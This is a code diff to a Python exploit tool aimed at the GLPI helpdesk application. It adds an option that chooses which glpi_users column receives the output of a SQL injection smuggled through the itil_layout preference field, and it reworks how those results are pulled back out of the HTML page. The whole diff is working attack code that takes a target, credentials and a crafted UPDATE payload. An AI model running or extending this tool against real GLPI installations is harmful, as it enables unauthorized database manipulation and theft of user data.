@@ -33,6 +33,7 @@ class CustParser:
         common_parser.add_argument('-p', '--password', help='Password to use', required=True)
         common_parser.add_argument('-t', '--target', help='Target to attack', required=True)
         common_parser.add_argument('--auth', help='Authentication to use (default: empty)', default="")
+        common_parser.add_argument('--store-column', help='Column to use to store result (default: %(default)s)', default="realname")
 
         subparsers = self.parser.add_subparsers(dest='action', required=True)
 
@@ -196,6 +197,7 @@ class GlpiExploit(Exploit):
     """
 
     _TABLE = "glpi_users"
+    _COLUMN_DEST = None # store the result in column realname by default
 
     def __init__(self, target, username, password, proxy, auth):
         super().__init__(target, username, password, proxy)
@@ -203,6 +205,11 @@ class GlpiExploit(Exploit):
         self.fields = {"login": "", "password": ""}
         self.isLoggedin = False
         self.auth = auth
+
+    @classmethod
+    def set_column_to_receive_result(cls, val):
+        cls._COLUMN_DEST = val
+        Printer.vlog(f"Storing result in column: {Printer.ANSI_YELLOW}\"{cls._COLUMN_DEST}\"{Printer.ANSI_RESET}")
 
     def login(self):
         if(self.isLoggedin):
@@ -296,7 +303,7 @@ class GlpiExploit(Exploit):
         else:
             value_encoded = value
 
-        sqlPayload = f"', itil_layout=NULL, realname={value_encoded} WHERE {where_col}={where_cond_encoded}; -- '"
+        sqlPayload = f"', itil_layout=NULL, {GlpiExploit._COLUMN_DEST}={value_encoded} WHERE {where_col}={where_cond_encoded}; -- '"
 
         update_payload = {
             "itil_layout" : sqlPayload
@@ -528,14 +535,20 @@ class GlpiExploit(Exploit):
         Printer.msg("File shall have been deleted, cannot check it from web")
 
 
-    def extract_val_from_pref(self, html, val="realname"):
-        pattern = re.compile(rf'name="{val}" value="(.*?)"')
-        try:
-            return re.findall(pattern, html)[0]
-        except:
-            Printer.err("Result not found...")
-            Printer.verr(f"Could not find {val} in the html DOM...")
-            return ""
+    def extract_val_from_pref(self, html, val=None):
+        if val is None:
+            val = GlpiExploit._COLUMN_DEST
+
+        soup = BeautifulSoup(html, "html.parser")
+        res = soup.find(attrs={"name": val})
+
+        if res:
+            if res.has_attr("value"):
+                return res["value"]
+        
+        Printer.err("Result not found...")
+        Printer.verr(f"Could not find {val} in the html DOM... Maybe use the \"--store-column\" to store the result elsewhere")
+        exit(0)
 
     def refresh_all(self):
         resp = self.s.get(self.get_url("index"), verify=False)
@@ -676,6 +689,7 @@ if(__name__ == '__main__'):
 
     # Starting program
     Printer.vlog("Turning verbosity on")
+    GlpiExploit.set_column_to_receive_result(myParser["store_column"])
     glpi = GlpiExploit(myParser["target"], myParser["username"], myParser["password"], myParser["proxy"], myParser["auth"])
     glpi.parse()
 
